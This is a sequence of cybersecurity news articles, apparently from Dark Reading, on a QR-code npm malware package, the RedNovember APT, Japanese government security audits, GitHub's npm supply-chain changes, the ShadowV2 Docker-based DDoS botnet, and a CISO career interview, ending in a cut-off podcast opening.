Brown wrote in the post. ""Otherwise, it does nothing and exits quietly.""Supply Chain Attackers Leveling UpAs previously mentioned, the poisoned package itself probably couldn't have caused serious damage if embedded in software, given how passwords are now stored in cookies. However, the use of a QR code for further obfuscation is a ""creative twist by the threat actor"" that demonstrates how cyberattackers are continuing to level up in how they hide malware inside of legitimate-looking packages, according to Brown.This is why it's ""more important than ever for developers to use tools to check their software dependencies,"" to ensure that no malicious code is present, she added.Indeed, as dangerous as the QR code steganography technique may be, it's only a threat to the supply chain and, thus, end users if it actually makes it onto a victim's machine, Caldwell notes. This is why both developers and end users need to stay ahead of current obsfuscation techniques as they continue to evolve and grow, he says."

An emerging Chinese threat actor has been spying on Asian and Western governments, and high-value companies, using publicly available vulnerability exploits.When cybersecurity researchers publish proof-of-concept (PoC) exploits for software vulnerabilities, their aim is to inform and empower organizations to protect themselves. The catch, of course, is that the same information then becomes available to attackers capable of weaponizing them. In recent years, in fact, attackers have been investing time and effort into spotting and acting on these security disclosures before organizations get the chance.RedNovember (aka Storm-2077) does this better than anyone, according to a new report from threat intelligence vendor Recorded Future. It's an advanced persistent threat (APT) tied to one of the most sophisticated and well-resourced states on the planet, but it possesses no unique malware or techniques. Instead it manages to infiltrate major corporations and government agencies, in alignment with Chinese state interests, simply by beating them to the punch when new PoCs hit the Web.""It is important for both the public and private sectors to continue having conversations on this topic,"" says Sveva Vittoria Scenarelli, principal threat intelligence analyst at Recorded Future, in an email. ""The disclosure of vulnerabilities can be approached in thoughtful ways that make everyone, both vendors (or providers) and their customers, more secure, but there is significant nuance in how this process is conducted, why and how disclosure is approached, and in different organizations' ability to respond to such disclosure.""Related:'Confucius' Cyberspy Evolves From Stealers to Backdoors in PakistanRedNovember: Lazy, Yet PunctualIn April and May of last year, threat actors exploited a high-severity arbitrary file read vulnerability in Check Point security gateways (CVE-2024-24919) as a zero-day. The vendor recognized the issue later in May and acknowledged and released a fix for it on May 28. Two days thereafter, security researchers published a proof of concept (PoC).Exploiting zero-day vulnerabilities is not RedNovember's game — perhaps it doesn't have the resources, capabilities, or, more likely, the desire to do so. Instead, it keeps a close eye on vulnerability disclosures, and when a public PoC becomes available, it pounces on it. Barely four days after the CVE-2024-24919 disclosure, evidence suggests that RedNovember was actively probing Check Point's gateways, Recorded Future said.The same went for CVE-2024-3400, a 10 out of 10 CVSS-rated arbitrary file creation issue from that same period that affected Palo Alto's GlobalProtect remote access platform. RedNovember has targeted other edge devices such as SonicWall products, Cisco Adaptive Security Appliance, F5 Network's BIG-IP, Sophos SSL VPN, and Fortinet FortiGate instances, and Ivanti Connect Secure virtual private network (VPN) appliances.Related:Charon Ransomware Emerges With APT-Style TacticsAfter cheating off of other people's work to exploit vulnerabilities, RedNovember also deploys other people's malware. It uses the Go-based LeslieLoader to deploy programs like SparkRAT, a cross-operating system (OS) infostealer linked to various Chinese cyber campaigns; Pantegana, a Go-based command-and-control (C2) framework; and Cobalt Strike, a widely used penetration testing suite.RedNovember uses commercial tools for all of its other related activities, too. Commercial VPNs like ExpressVPN help it connect to its own infrastructure. In April 2025, Recorded Future's researchers even found it using the Internet Archive's Wayback Machine — a tool more common among cybersecurity reporters than the threat actors they write about — and they don't know exactly why. Scenarelli imagines, ""RedNovember might have been using it as part of its reconnaissance: to try and pinpoint any changes in organizations' Web pages over time, or to scan organizations' live Web pages to see what they look like at the moment of the search, for example. It could even be RedNovember trying to remove paywalls from publications in order to read articles that might be relevant to its reconnaissance activity.""Related:Koreans Hacked, Blackmailed by 250+ Fake Mobile AppsEspionage Timed With Geopolitical ShiftsUnbelievably, these rather conventional and low-effort cyberattacks consistently bear fruit against government agencies and companies in sensitive sectors. RedNovember's victims span technology companies in Taiwan, manufacturers in Europe, and government entities throughout Southeast Asia (sans China), Recorded Future wrote. Its campaigns closely mirror Chinese state interests, arguably more than most other Chinese APTs.Consider Fjii, as an example. The tiny Pacific Island nation doesn't tend to feature high on most people's lists of countries of geopolitical import, but it's an important cog in China's Belt and Road Initiative. In July 2024, RedNovember targeted Outlook Web Access (OWA) and Sophos UTM logins to spy on more than 50 Fijian organizations in the government, finance, and media, as well as multiple land, sea, and air transportation authorities of particular relevance to Belt and Road.There have been more worrying cases, too. On Dec. 9, 2024, China's military initiated a genital-measuring contest off the coast of Taiwan, deploying nearly 100 warships and vessels to simulate wartime battle and blockade scenarios. The researchers found that on that very same day, and continuing for a week thereafter, RedNovember performed cyber reconnaissance on a location in Taiwan that is home to semiconductor research and development and a Taiwanese military airbase.Scenarelli warns that ""RedNovember is highly likely gathering, or attempting to gather, intelligence on matters of clear strategic interest, at specific points in time."""

Japan faces increased cyberattacks from nation-state actors and cybercriminals, but has fallen behind in managing the cybersecurity of critical government systems, according to reports.Earlier this month, Japan's Board of Audit identified 58 critical systems at a dozen government agencies that lacked appropriate security controls and management, according to the group's latest report. The findings come as the Japanese government faces increased cyberattacks, with at least 447 cybersecurity incidents reported in 2024, more than double the previous year, according to data cited by online news site Nikkei Asia. While Japan's commercial industries are targeted by ransomware and info-stealers, the government continues to find itself the focus on cyber-espionage attacks and cyber-physical attacks on critical infrastructure. The extended MirrorFace campaign, for example, has likely led to critical data loss, says Jon Clay, senior threat researcher at cybersecurity firm Trend Micro.""Japan is friendly with the United States and, as such, is a target for nation-states, especially China, who performs cyber espionage and intelligence gathering attacks against them,"" he says. ""We've seen a number of Chinese APT groups as well as DPRK [North Korea]-based Lazarus Group targeting Japan.""Related:Southeast Asian Scam Centers Face More Financial SanctionsFrom massive spam campaigns to Chinese groups targeting a critical flaw in Ivanti Connect Secure products to North Korea trying to embed IT workers in Japanese firms, the threat landscape facing Japan has grown significantly and comes at a time when the country is aiming to take a greater role in securing the regional Internet. A year ago, for example, the US, Japan, and the Philippines inked an agreement to share cybersecurity threat data, following China's Volt Typhoon attacks on critical infrastructure — and later the Salt Typhoon attacks on telecommunications. And earlier this year, Japanese lawmakers passed the Active Cyber Defense Bill to allow law enforcement to respond with active measures — such as shutting down servers — against foreign attacks.Stronger Offense, Weaker Defense?Following Japan's creation of cybersecurity standards, the nation's Board of Audit periodically reviews critical systems responsible for delivering government services. The Board of Audit found that 58 of the 356 critical systems were not maintained according to the cybersecurity standards. In addition, the board found that the responsible ministries had no business continuity plans in place for 259 of the systems (73%).Related:Asian Orgs Shift Cybersecurity Requirements to SuppliersThe Board of Audit is not the only group to find security holes in Japanese systems. Earlier this year, cyberattackers targeted a vulnerability in PHP Common Gateway Interface (CGI) implementation on Microsoft Windows systems in Japan to install Cobalt Strike reverse proxies on compromised systems, Cisco's Talos threat-intelligence group stated in a March analysis.""We found that the attacker predominantly targets organizations in Japan across various business verticals, including technology, telecommunications, entertainment, education, and ecommerce, based on our analysis of command and control (C2) server artefacts,"" the analysis stated.At the same time, Japan is ramping up its offensive capabilities, passing the Active Cyber Defense Law in May, ""marking a pivotal shift in the country's cybersecurity strategy,"" according to an analysis by the Center for Cybersecurity Policy and Law. The law requires that critical infrastructure operators report cybersecurity incidents to the government and gives the government the ability to intercept foreign Internet traffic.The law also ""empowers government agencies, under strict oversight, to monitor and respond to suspicious cyber activities before they cause harm,"" the analysis stated. A planned Cyber Council will act as a hub between government agencies and private partners.Related:China Questions Security of AI Chips From NVIDIA, AMDGreater Tensions, More CyberattacksJapan is racing to establish a strong cyber defense as it faces greater threats. Trend Micro, for example, sees a number of Chinese and North Korean threat actors, such as the Lazarus Group, targeting Japan for its alliance with the US- and Western-aligned nations, while the country's robust economy tends to attract cybercriminals.In March, Japan's telecom giant NTT Communications suffered a breach that compromised data on 18,000 companies and an unknown number of individuals. Meanwhile, the government has faced a five-year campaign, known as MirrorFace, that has attempted to steal information, exploit vulnerabilities, and phish credentials from policy experts, politicians, and academics.Japan's security organizations, like others, need to eschew a siloed focus on products and services and instead look to improve visibility into the entire attack chain while backstopping their capabilities with advanced automation and AI capabilities, Trend Micro's Clay says.""Governments and businesses have to shift how they look at implementing cybersecurity,"" he says.

GitHub this week committed to a more secure NPM supply chain in the wake of a handful of attacks causing widespread compromise.On Sept. 22, GitHub senior director of security research Xavier René-Corail published a blog post to GitHub addressing the surge in package registry-based attacks, specifically NPM packages. The post comes in the wake of two major supply chain attacks involving NPM packages this past month: the self-replicating Shai-Hulud malware campaign and a social engineering attack against prolific developer Qix.In the case of Shai-Hulud, an infostealing malware that embedded itself in poisoned malware packages and could steal secrets including NPM tokens, GitHub said the worm could have resulted in an endless stream of attacks if the security industry didn't take swift action. For its part, the company said it immediately removed more than 500 compromised packages and blocked new packages containing the malware's indicators of compromise.In addition to these actions, GitHub said it would take steps to harden the NPM supply-chain and make package publication more secure.GitHub Aims to Secure NPM Supply ChainGitHub highlighted three core changes.

Since then, trusted publishing has been added to RubyGems (December 2023), crates.io (July 2025), npm (also July 2025), and most recently NuGet (September 2025), as well as other package repositories.""GitHub, which is a subsidiary of Microsoft, will also deprecate legacy classic tokens, deprecate time-based one-time password in favor of FIDO-based two-factor authentication, place further limitations on granular tokens while disallowing tokens by default, removing the option to bypass 2FA for local package publishing, and expand the list of eligible providers for trusted publishing.""We recognize that some of the security changes we are making may require updates to your workflows,"" René-Corail wrote. ""We are going to roll these changes out gradually to ensure we minimize disruption while strengthening the security posture of npm. We're committed to supporting you through this transition and will provide future updates with clear timelines, documentation, migration guides, and support channels.""Related:Red Hat Investigates Widespread Breach of Private GitLab RepositoriesGitHub encouraged NPM maintainers to consider using NPM-trusted publishing instead of tokens, strengthen publishing settings to require 2FA, and to use WebAuthn instead of TOTP when configuring 2FA.Mike McGuire, senior security solutions manager at Black Duck, tells Dark Reading that GitHub's changes mark ""an important step forward"" for NPM security, addressing the problems of weak authentication and overly broad, long-lived tokens.""By enforcing modern 2FA and adopting granular, short-lived tokens, GitHub is raising the bar for attackers and closing off some of the paths that enabled incidents like the Qix compromise and Shai-Hulud,"" McGuire says. ""That said, no single change will fully prevent these types of attacks. Package registries are only one part of the open source software supply chain, and attackers are increasingly creative in finding ways to compromise popular projects.""A Promising Step, But Is It Enough?Although all security enhancements are appreciated, time will tell how they will fare against similar threat campaigns to Shai-Hulud in the future.Related:Sneaky, Malicious MCP Server Exfiltrates Secrets via BCCMichael Freeman, head of threat intelligence at Armis, tells Dark Reading that GitHub's recommended actions are steps in the right direction, but small ones. Freeman argues a more comprehensive security process will be needed to make lasting changes, including static and dynamic analysis (SAST/DAST), enforcing reproducible builds to ensure source equals artifact, real-time monitoring of suspicious registry activity and abnormal uploads, and more.Danny Allan, chief technology officer at Snyk, similarly calls GitHub's actions a ""welcome step forward"" but notes the sophisticated ways threat actors target repositories. ""They add stronger controls against maintainer account compromise and worm-style propagation,"" Allan says. ""But this is not a silver bullet. Attacks like Shai-Hulud and Qix exploited far more than just stolen tokens, from compromised maintainers and typosquatting to malicious code injections. And today, attackers are increasingly using AI to automate and scale those attacks. Token changes alone don't stop developers downstream from unknowingly installing already-compromised packages."""

A recently uncovered dedicated denial-of-service (DDoS) for-hire botnet highlights how attackers are repurposing cloud-native development tools to build infrastructure that looks and behaves like legitimate enterprise software, significantly complicating detection and disruption for defenders.Researchers at Darktrace christened the botnet ""ShadowV2,"" after spotting activity that hit the vendor's honeypots that run on AWS EC2.Broad DDoS CapabilitiesThe company's subsequent analysis revealed the botnet to be a fully featured DDoS platform that combines advanced attack methods, including HTTP/2 rapid resets, large-scale HTTP floods, and a bypass of Cloudflare's ""Under Attack Mode"" (UAM), which lets the attackers get past Cloudflare's challenge pages and flood protected sites with malicious traffic. ShadowV2 also includes a user-friendly operator interface, OpenAPI-based controls, and a dynamic container deployment capability that allows operators to launch highly configurable attacks while concealing their activity behind cloud-native architecture.""For defenders, the implications are significant,"" Darktrace said in a blog post this week. ""Effective defense requires deep visibility into containerized environments, continuous monitoring of cloud workloads, and behavioral analytics capable of identifying anomalous API usage and container orchestration patterns.""Related:Despite More CVEs, Cyber Insurers Aren't Altering PoliciesThe ShadowV2 campaign targets Internet-exposed Docker daemons — or servers — on Amazon's AWS EC2 cloud infrastructure. By default, Docker is not accessible this way because of significant security risks. But organizations can sometimes configure them for external access for remote management of external hosts, CI/CD pipeline integration, or for testing and development, and other purposes.""The Docker daemon listens on port 2375,"" says Nate Bill, threat intelligence engineer at Darktrace, pointing to data from Censys, which shows there are currently 24,000 IP addresses with this port open. ""However, likely not all of these are exploitable,"" he says.According to Darktrace, the attacker scans for Docker daemons that are configured for external access. Unlike the usual attacker approach of uploading a preprepared image or weaponizing an existing Docker Hub image, ShadowV2 operators deploy a generic ""setup"" container on the Docker server. They then install their tools and malware components within it before deploying it as a live container. Darktrace found the attackers using a Python script hosted on GitHub Codespaces to programmatically interact with Docker via the Python Docker SDK and handle the entire container deployment, configuration, and launching process.Related:Phishing Is Moving From Email to Mobile. Is Your Security?A Versatile Malware ToolThe malware itself, like many modern malicious software tools, is an ELF binary written in the Go programming language. Once installed, it communicates with its command-and-control (C2) server using a unique identifier and timestamp. The malware sends a heartbeat signal to the C2 server every second, while also polling for new attack commands every five seconds. The commands the malware can receive specify the attack type, target URL and port, duration, and other DDoS-related information.""The attacker discovers misconfigured Docker servers by scanning the Internet for them,"" then deploys a malicious container where they install their malware tools, Bill says. ""The specific approach [the attacker] uses of building the environment on the victim's system, instead of uploading a complete image, is unique. DDoS-for-hire services leveraging exposed docker environments are also uncommon,"" he says.He says the biggest draw of the ShadowV2 for potential buyers of the DDoS service is likely going to be its HTTP2 rapid reset features and the Cloudflare UAM bypass capability, both of which are effective DDoS attacks. ""It is not possible to track how many servers are currently infected with ShadowV2 without access to the botnet control panel,"" Bill says. ""However, we have observed commands from the attackers to launch attacks against at least one website, showing it is in active use.""Related:Shutdown Threatens US Intel Sharing, Cyber DefenseKelvin Lim, senior director and head of security engineering at Black Duck, says ShadowV2's targeting of misconfigured Docker containers on AWS is significant and a reason why organizations need to strengthen protections around that environment. ""Container security hardening is critical to any organizations running containers,"" Lim says. ""Organizations must enforce least-privilege, disable exposed Docker APIs, and implement strong authentication for their orchestration tools. Traditional perimeter defenses such as firewalls alone are insufficient.""The ShadowV2 campaign shows how threat actors are approaching DDoS-for-hire services like a business, complete with APIs, dashboards, and user interfaces, adds Shane Barney, chief information security officer (CISO) at Keeper Security. ""This type of industrialization should be a wake-up call for defenders,"" he says. ""To counter these threats, organizations need to adopt a zero-trust mindset. This includes continuous verification across every container, API, and workload."""

Welcome to Dark Reading's Heard It From a CISO video series, showcasing advice on breaking into and advancing within the cybersecurity field from those who have been there. In this latest installment, Dark Reading associate editor Kristina Beek interviews Jason Manar, chief information security officer (CISO) at Kaseya, where he discusses the many pathways into cybersecurity, highlighting that professionals can enter the field from various backgrounds, including finance and management. He shares examples of successful team members — some with numerous certifications and others with valuable experience but no formal credentials — emphasizing that multiple roads can lead to success in cybersecurity.Manar also addresses concerns about AI's impact on entry-level cybersecurity positions, acknowledging that while some consolidation may occur, new opportunities will emerge. He strongly recommends gaining practical experience through internships, even at smaller organizations or educational institutions, to build relevant skills that help candidates stand out. Also, check out our other installments in this series: ""Cyber Career Opportunities: Weighing Certifications vs. Degrees"" with longtime CISO Melina Scotto, and ""Male-Dominated Cyber Industry Still Holds Space for Women With Resilience"" with Weave Communications CISO Jessica Sica.Related:How Architectural Controls Can Help Fill the AI Security GapKaseya's Jason Manar: Full Video TranscriptThis transcript has been edited for clarity.Kristina Beek: My name is Kristina Beek. I'm an associate editor with Dark Reading, and I'm here for our latest episode of Heard It From a CISO. I'm here with Jason from Kaseya.We're here to talk about beginning a career in cybersecurity, whether that means entry-level jobs, whether it means being interested as a college student, or maybe you're long into the career you've had and you're pivoting into cybersecurity. There are a lot of resources online, but it's not every day that we get to hear from a CISO such as yourself. So, I'd love it if you could introduce yourself and tell us about your background and the work you do as a CISO.Jason Manar: Thank you for having me, and I want to make sure I keep this as brief as possible because I really want to get into things that are going to help our listeners right now and their personal journey, which I know can be very different and sometimes very interesting and complex.My name's Jason Manar. I've been in this field well over two decades. I got my start in the FBI back before data aggregation and being a data geek was really cool. I was doing a lot of that and it was helping me solve cases; and the FBI actually took notice when they saw some of the things that I was doing with data, which now are not as unique as they were 20 years ago. They at that time said, Hey, we need somebody that thinks that way around data in our cybersecurity program, and that's how I started my cybersecurity journey.Related:For One NFL Team, Tackling Cyber Threats Is Basic DefenseI worked on over 1,000 different intrusions in the FBI, got to work with the world's best and some of the worst CISOs around the world within those different intrusions, and got to see what really worked well, what didn't work well, and still maintain that network and have some of the greatest relationships around the world with security practitioners. It's really interesting because it really is a small world when you start talking about security practitioners around the globe. That's a quick overview of how I got into security and then obviously became the CISO of Kaseya about four years ago.KB: You talk about your past experience working with the FBI, and I read about this, that you assisted your current company with a ransomware attack. Could you talk about that? And if that was the catalyst as to why you decided to join your current company, what went on there?Related:China Imposes One-Hour Reporting Rule for Major Cyber IncidentsJM: It's a great question. I fell in love with understanding what adversarial activity looks like on a daily basis, and how that was changing and how they were manipulating people's psychology and behaviors to get into systems, along with some of the very specific things and technical aspects that incorporate what we understand as being zero-days and nation-state activities. I just really found that very interesting, and because of that, went deeper down the rabbit hole of cybersecurity and specializing in that within the FBI.I was very fortunate to work many intrusions and be involved in many cases due to that level of expertise and that knowledge set, and I rose through the ranks of the FBI. When the Kaseya event happened, I had an opportunity to come over to Kaseya.I was very fortunate to have some wonderful mentors around me that were quick to point out a lot of the successes that I've had that quite frankly; many people never get to experience within the FBI. I realized that I didn't need something hanging on my wall for me to have had success and start that new chapter. I credit those relationships as well as my own personal faith in leading me to make that jump from public sector to private sector. I've been very blessed to work with some of the greatest people around the world in the public and private sector. You're working with a lot of the same people because it's a very small community.KB: Even though it's a small community, I'm not sure a lot of entry level students or career professionals maybe know the difference between cybersecurity work in the private sector versus working in the public sector, could you talk about some noticeable differences that you've seen?JM: One, the barrier to entry with certain governmental jobs and certifications and experience sometimes is going to be higher. The reason I say this is I, as well as several other CISOs, pride ourselves of finding cybersecurity talent in unconventional places.I won't name the CISO because I don't know whether he would want me to name him or not, but a Fortune 100 company CISO and I were talking and when we were talking about some of the hires, one of the hires that he was most proud of was somebody in their finance team and it was somebody that thought about the business and cybersecurity very differently.They were trying to get into cybersecurity as basically a second career. They had had the opportunity to see some of the cybersecurity professionals within their company in action. It caused them to start doing some research on their own, and kudos to this employee, they reached out to the CISO and had an interview and shortly after was asked to join the team with the entry level position.This person absolutely thrived and they brought a new perspective because of their financial background that actually helped them re-evaluate and actually explain risk better to the business. I like to do the same thing. We have several people internally that we have promoted from areas of customer service, areas of engineering, areas of R&D, that have that shared love of cybersecurity that they have gleaned or gained over the years and have turned themselves into wonderful cybersecurity practitioners.KB: That's awesome. What would you say is the best way for someone to enter this field? Because what you're talking about, this example you just gave, somebody is clearly pivoting into cybersecurity when they've already had maybe an extensive career behind them. So, clearly there are a lot of different paths. Some people pursue degrees in this field; some really prioritize certifications. What would you say maybe is their best bet?JM: The wonderful thing about cybersecurity is it's not one-size-fits-all. There are many different paths that can lead you to similar outcomes.I think back to some of the unconventional hires that we hired. I had someone that took the initiative to literally just come meet me, had never been in cybersecurity before, had not had any certifications, but had this really strong passion for learning new things and developing new skills. He was able during the interview to convey how he very much was able to take things that he had just learned and action them very quickly, which are all things that we're looking for, especially for junior and new employees.He has quickly become just an absolute stellar employee and rose through the ranks of junior to senior analyst in a very short order, and has wound up taking numerous online courses, obtained numerous certifications, and has just done a wonderful job.Likewise, we've seen other people that have not necessarily gone the traditional path. I have an executive right now that doesn't have any of those certifications, but he has a very vast engineering program management background as well as a security background as an analyst. He has done numerous things that have allowed him to gain the ability to quickly understand almost every facet within cybersecurity that allows him great depth and breadth across almost the entirety of our cybersecurity program. While he doesn't maintain any current certs, he has had that experience that has been invaluable, and I would say more so than a certification.That's not to say certifications don't have their place and aren't useful, it's just to say that there are many different roads that may lead you to the same place.KB: You mentioned this story about somebody who worked in finance and then transitioned into cybersecurity. And what you just mentioned was somebody who maybe had experience in management and then came into cybersecurity. Cybersecurity is obviously seen as a very technical field and perhaps it is, but what would you say to those who want to work in this field but maybe want to work in the intersection of business and cybersecurity? Are there roles for them out there? What should they look for?JM: There are absolutely roles. Let's start with the things that I see that actually preclude someone from a certain position, like a lot of very good technical people that don't have the soft skills that allow them to be able to talk to other departments within the organization.And as we all know within security, while we may have certain positions that are somewhat isolated from the rest of the organization, a lot of our security practices rely upon our ability to influence others to ensure that they are meeting the needs of the company, that they are following policy standards, that we are communicating the risk to them appropriately in a way in which they understand. I understand everyone will get nervous. I understand everyone will get tripped up. I'm sure even as many times as you have interviewed people, knowing that this is going to go to thousands of people, you probably get a little butterfly every once in a while, or especially if you pause too long or say something.KB: Yeah. For sure.JM: We all get those, and one of the things that helps us a lot is preparedness and understanding at the end of the day. Whatever we are interviewing for, it's not personal. They may be looking for a unicorn, they may be looking for whatever else. But it is making sure that we bring the best representation of ourselves and it's making sure that we're able to have a conversation around not only the technical areas that we need, but also communicating some of the things that we've gone through. One of the best questions that I ask to get a sense of how people deal with things is just a very simple question about, Tell me about one of the most difficult periods of your life and how you got through that. That can be an example of something that's happened in business, personal life, or anything else. And I have gotten some wonderful answers both on the personal side, business side, as well as on the school side.But what I absolutely don't like is when somebody comes in and goes, ""Yeah, I had at the end of this year the project and people weren't pulling their weight. I just did everything and I turned it in and we got an A."" While I guess for some people they think that that is showing that they are taking on certain responsibility, but it shows me that you're not communicating with your team, you're not having difficult conversations with people, so I also push back and I go, ""OK, is this really in your 20 years of life the most difficult thing that you've experienced, or is it just something difficult that you've experienced in the last six months?""And typically they'll go, ""Oh, no, that's not it."" And then they'll share something else. Or some people double down and go, ""Yeah, that's the most difficult thing I've been faced with."" And then when I tell them a little bit more, especially around certain SOC positions, about some of the stress and some of the environment there and the challenges that are there day in and day out, I find that a lot of people haven't done their full research. What we find is that security is one of the more stressful jobs that one can ever have, and oftentimes you see issues coming out of security professionals and teams that are almost as high as that of first responders, and we all know what first responders go through.But I find people that are getting into this sometimes are like my son. When he first learned about some remote security jobs, he goes, ""Dad, you're in security. You never told me that you could potentially be remote and you could make X amount of money."" And I go, ""Yeah, tell me what job that is."" And he told me what job it was. And I go, ""Now look at the job description, you're going to be on call. You're going to be responsible to ensure x,y, and z,"" and I start walking him through the entire process of what he's going to be responsible for and how he's going to be the front line and how he may be the sole practitioner between him, their company and the adversary. And he's like, ""Oh my gosh, that's way too much stress. I can't handle that."" And I'm like, ""Well, you could, you just need to be prepared for it."" So I want to make sure people that are listening do some research and go into things eyes-wide-open.And there are some wonderful things and opportunities that come with being cybersecurity practitioners, but it is not for the faint of heart. It is very stressful at almost all levels. It is high stress, but very high reward. We are protecting some of the most critical infrastructure that this world has to offe,r and we provide resources to various companies that are literally keeping the lights on, educating the public, providing healthcare services. Those are all things that the majority of us in the software business do day in and day out as security practitioners.But at the end of the day, that comes at a very high cost because you realize that if you make a mistake, if you don't take this job seriously, there are serious repercussions. And so that's one of the reasons that both on my team and throughout the company, we take mental health very seriously and we make sure that people are taking time for themselves, and that we are talking about the daily stressors that come with this job because there is a severe burnout rate within the cybersecurity industry. All you have to do is look at it online, but it's one of those things where I don't think enough people look at that aspect before they apply. They look at the potential salary and potential opportunity. And then to your point, they may be three certifications in, even a bachelor's or master's degree in, and then feel trapped. And then at the end of the day, that's not healthy for them. It's not healthy for the company, and we want to make sure that your listeners know exactly what they're getting into.KB: Right, Yeah. So to your point about how essential and critical cybersecurity is as a field and as a profession, it's clear within technology as a whole that anything in technology is quickly changing, quickly advancing. And I certainly know that some people are quite worried about what that means for some of these entry-level jobs, say with AI and how maybe it's replacing some of the job responsibilities that these entry-level roles require. What could you say about that?JM: So, you think there's going to be new opportunities in AI, right? There will be new opportunities and you see this now with various engineering positions where there are more positions for generative AI and new positions within engineering. So is there consolidation that may take place with entry or junior level jobs? Yes, absolutely. Will there still be some type of junior job or entry level job? There will. I just think that's going to be redefined as to what that is, right? And it's going to require people to really think about the experiences that they have.One of the things that I would probably change if I could go back in time was my time in college. I spent a lot of time working very hard in factory farm work, labor-intensive work to pay some bills. Had I known what I know now, what I would do to try to find even a lowly paid internship within the industry that I would want to go into, I would really try to get that more than anything.What I found is people that have been in our internship program have been given vastly different opportunities to interview for positions that they hadn't had just six months prior. I think finding ways of getting experience within your industry is going to help you immensely, and then understanding that there may be times that you can't get a job within Google, Microsoft, even a company like Kaseya, and I may need to start at a MSP or an IT firm, or I may need to start in my local university and help their IT or security program.There are ways of getting experience that will allow you to surpass that junior title, and I think it's incumbent on all of us to think about how do we get that experience, obtain that experience, and so that we are ready and that we don't get caught up in the AI revolution and the potential downsizing that may come from the efficiencies that we see within the AI role.KB: Yeah, that kind of reminds me of my interview with Jessica Sica, who's CISO at Weave. She was talking about how she first got started because she was working at a help desk when she was younger in terms of IT stuff, and that's how she started going up the ranks. Right now in cybersecurity, what would you say about how to look for a mentor and what to look for in a mentor?JM: I focus really hard on identifying and understanding my areas of weakness, and I look for people that have strengths where I am weak. So I surround myself with not only those people, but I also include them as my mentors, right? So that they can provide visibility into what otherwise would potentially be blind areas. And so I think that's one way to start looking for mentors is understanding.Maybe if you're early in a position, you just need somebody, anybody, to talk to. But you need to be really careful because not all advice is good advice.KB: Right.JM: Right. And so just because somebody has a title doesn't necessarily mean that they have the best advice. Does this person have the traits and qualities first and foremost, a human being that I respect, that I can align to and I understand? And then, it's do they cover areas or gaps or potential weaknesses I have?And then it's about finding ways to be bold and take action. I can't tell you the number of people that I have been able to meet just because I reached out to them. Early on, I would have been intimidated. I would have been like nobody would care or know who I am, and that may be the case. But I have people that I reach out to all the time. There's a kid that I spent a lot of time with in college and he just reached out to me on LinkedIn. And I remember my son and my wife like, Who's this? And I'm like somebody I met on LinkedIn. They're like, Great, you're going to be the CISO that actually gets scammed. I'm like, They don't want anything from me. This person lives in South Florida and I've actually met them once now. KB: Yeah.JM: And just understanding that you need to reach out and you're going to get a lot of no's, but you're eventually going to get somebody that says yes, and then you're going to start learning what you need. And you're going to start learning about whether or not the advice that you're being given translates into actions that are manifesting what you need them to manifest. I've had several people that I've tried to mentor and it hasn't worked out. And nine times out of 10, the reason that it doesn't work out is because we will go over and we will talk about things. They will have an action plan and then they don't follow up on it. And so the quickest way to lose a mentor is to just constantly be taking certain advice and then never following through or actioning. If basically all you're doing is using that person as somebody that you can then vent to, that's not a mentor.KB: That brings me to one of my last questions, which is you talk about being unapologetic, being bold, being a good communicator. What else stands out to you in terms of those you've managed; what experience or qualities do they have that make them a standout as an employee in cybersecurity?JM: So those people that have been through adversity, right? It's the reason that I brought up the one question about the most difficult time that you've been through, because in life and in business, there are going to be successes and failures. A lot of times, in order to succeed, you have to be able to fail and fail fast in order to get to the right decision, right? And get to the right X. You've got to be able to be able to adapt and overcome adversity very quickly and potential failure very quickly to move on and iterate to what is successful. And why that's important is because especially in cybersecurity, we are in an ever-changing field. This changes almost minute-to-minute as to adversarial abilities, tactics, what they're doing at any given moment. And if you're not staying up with that and you're constantly doing the same thing over and over and expecting a different result, it's not going to happen. So I think that resiliency is a key part of being successful and one of those things that we're constantly looking for. We're also looking for that curiosity so that they can grow that technical knowledge set. KB: Right.JM: I used to be embarrassed when I shared this story and somebody said, hey, this is exactly what you look for in interviews. But one of the things that I share that I love to do is I love to work on cars and they're like, oh, so you worked on cars when you were younger and I was like, no, I got tired of my car not running and I didn't have money at some point in time. And so I read a lot of books and I watched a lot of YouTube and I figured out how to take my engine apart and change various gaskets. And I scared the heck out of my wife one day because she literally came home and the engine was in parts and she's like, What have you done? And I put it back together and it all worked and it actually fixed the problem. But what somebody pointed out to me is, that was you exploring, showing curiosity, showing a way to continue to evolve skill sets even in your daily life. And so that's what we're constantly looking for, because if you're going to do it in your daily life, you're going to do it in your professional life.KB: Absolutely. Yeah. Thank you for that. Well, those are all the questions I have, but do you have any last words? I know we talked a lot, so it's OK if not, but if you have any last words, please.JM: At the end of the day, we all have one life and you are the central character within that life, and I would encourage each and every one of you to be bold, to reach out to people that you wouldn't necessarily reach out to. To take leaps of faith. And when I say take leaps of faith, that means you don't just go unprepared and try to do something, but you figure out what successful looks like, and then you do everything that you can to manifest that within yourself. There are so many things that can be taken advantage of right now that are free, that quite frankly we didn't have 20 and 30 years ago that will allow you to level up your level of understanding within this field, will allow you access to leaders within this industry, and I've seldom met a CISO or a security practitioner that doesn't love to share their knowledge and understanding of the field with new and incoming folks that are wanting to learn more. So please reach out, be bold and just know that no matter how technical or hard something looks, you have to start somewhere. So start your journey today.KB: Awesome. Thank you so much, Jason, and thank you for being on this latest episode of Heard it From a CISO. I appreciate it so much.JM: Thank you. It's been a pleasure. Have a great day."

But here we are. And here's what comes next, according to Frank Cilluffo from the McCrary Institute and Booz Allen's Dave Forbes.
Becky Bracken: Hello, and welcome to Dark Reading Confidential. It's a podcast from the editors of Dark Reading focused on bringing you real world stories straight from the cyber trenches.I'm Becky Bracken, your host. And today we are going to be talking about why protecting US critical infrastructure from cyberattacks is such an increasingly challenging proposition. To help us understand more, we are joined today by two deep subject experts. First, Dave Forbes. He leads Booz Allen's cyber physical defense business focused on operational technology, weapons systems, and space mission system cybersecurity.Welcome, Dave. Appreciate you.Dave Forbes: Thanks, Becky.Becky Bracken: We also have Frank Cilluffo. He is the director of the McCrary Institute for Cyber and Critical Infrastructure and the host of the Cyber Focus podcast. Welcome, Frank. We very much appreciate you too.Frank: Thank you, Becky. Pleasure to join you.Becky Bracken: Yeah, well, OK, you guys are deep in the trenches on this. We have a lot of ground to cover, but I wanted to start with a recent paper that you all collaborated on. And I think it really illustrates for us where US critical infrastructure exists that maybe we might not even think to look. Dave, can you tell us a little bit about the ports and the Chinese threat that you observed there?Related:Despite More CVEs, Cyber Insurers Aren't Altering PoliciesDave Forbes: Sure, Becky, great opportunity to be here today. I think the topic that you selected is one that's very timely, but it's been timely for quite a while now. We're thrilled to be partnering with 